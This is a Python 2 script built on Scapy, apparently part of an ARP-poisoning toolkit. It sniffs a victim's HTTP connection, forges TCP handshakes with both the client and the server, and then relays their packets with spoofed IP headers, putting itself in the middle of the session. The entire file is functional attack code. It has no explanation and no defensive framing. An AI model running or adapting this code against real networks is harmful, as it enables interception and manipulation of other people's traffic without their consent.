from scapy.all import *
from arppoison import gethostmac

def forward(p):
    print p.summary()
    if p[Ether].src == attackerMac:
        return
    if p[IP].src == ipToSpoof:
        ipLayerC.type = p.type
        ipLayerC.version = p.version
        ipLayerC.ihl = p.ihl
        ipLayerC.tos = p.tos
        ipLayerC.len = p.len
        ipLayerC.id = p.id
        ipLayerC.flags = p.flags
        ipLayerC.frag = p.frag
        ipLayerC.ttl = p.ttl
        ipLayerC.proto = p.proto
        send(ipLayerC / p[TCP], iface = 'enp0s3')
    elif p[IP].src == ipVictim:
        ipLayerS.type = p.type
        ipLayerS.version = p.version
        ipLayerS.ihl = p.ihl
        ipLayerS.tos = p.tos
        ipLayerS.len = p.len
        ipLayerS.id = p.id
        ipLayerS.flags = p.flags
        ipLayerS.frag = p.frag
        ipLayerS.ttl = p.ttl
        ipLayerS.proto = p.proto
        send(ipLayerS / p[TCP], iface = 'enp0s3')
        
def startforwarding(ipServer):
    global ipToSpoof, ipVictim, ipLayerS, ipLayerC, attackerMac
    attackerMac = gethostmac()
    ipToSpoof = ipServer
    print "Listening as " + ipToSpoof

    # Start TCP handshake with client
    a = sniff(count = 1, filter = "tcp and port 80 and host " + ipToSpoof, iface = 'enp0s3')
    ipVictim = a[0][IP].src
    port = a[0].sport
    print "Connection from " + ipVictim + ":" + str(port)

    # TCP handshake with server
    ipLayerS = IP(src = ipVictim, dst = ipToSpoof)
    tcpLayer = TCP(sport = port, dport = 80, flags = "S", seq = a[0].seq)
    answer = sr1(ipLayerS / tcpLayer, iface = 'enp0s3')
    tcpLayer = TCP(sport = port, dport = 80, flags = "A", seq = answer.ack, ack = answer.seq + 1)
    send(ipLayerS / tcpLayer, iface = 'enp0s3')
    print "Handshake 2 completed"
    print "---------------------"

    # Finish TCP handshake with client
    ipLayerC = IP(src = ipToSpoof, dst = ipVictim)
    synAck = TCP(sport = 80, dport = port, flags = "SA", seq = answer.seq, ack = a[0].seq + 1)
    print sr1(ipLayerC / synAck, iface = 'enp0s3').summary()
    print "Handshake 1 completed"
    print "---------------------"

    sniff(filter = "tcp", prn = forward, iface = 'enp0s3')
